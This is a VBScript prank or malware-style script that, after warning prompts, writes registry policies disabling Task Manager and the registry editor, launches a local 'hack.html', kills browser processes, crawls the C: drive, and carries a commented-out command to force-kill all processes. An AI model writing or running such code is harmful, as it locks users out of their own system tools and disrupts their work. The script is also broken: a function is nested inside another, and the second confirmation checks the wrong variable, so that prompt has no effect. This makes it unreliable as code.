

answer = MsgBox("WARNING: This can harm your computer, Do you want to run it", vbYesNo, "WARNING")

Function run()
    set shell = createobject("wscript.shell")
    set fso = createobject("scripting.filesystemobject")
    shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",0,True
    shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f",0,True
   shell.run fso.GetParentFolderName(WScript.ScriptFullName) & "\hack.html",0,True
  wscript.sleep 3000
  set wmiservice = getobject("winmgmts:\\.\root\cimv2")
  set colprocesses = wmiservice.ExecQuery("Select * from Win32_Process Where Name Like 'chrome.exe' OR Name Like 'firefox.exe' OR Name Like 'iexplore.exe'")

' Iterate through the processes and terminate them
For Each objProcess In colProcesses
    objProcess.Terminate()
Next
    
    function countfiles(folder)
    set folder = fso.getfolder(folder)
    
    filecount = 0

    filecount = folder.files.count

    for each subfolder in folder.subfolders
        filecount = filecount + countfiles(subfolder.path)
    next

    countfiles = filecount
   end function
   rootfolder = "c:\"
   filecount = countfiles(rootfolder)
   
    ' shell.run "taskkill /f /im *"
End Function

If answer = vbYes Then
    answer2 = MsgBox("WARNING 2:If you run the program, it will destroy the computer, Do you want to actually proceed?", vbYesNo, "WARNING")
    If answer = vbYes Then
     run
    Else
     wscript.quit
    End If
Else
    wscript.quit
End If
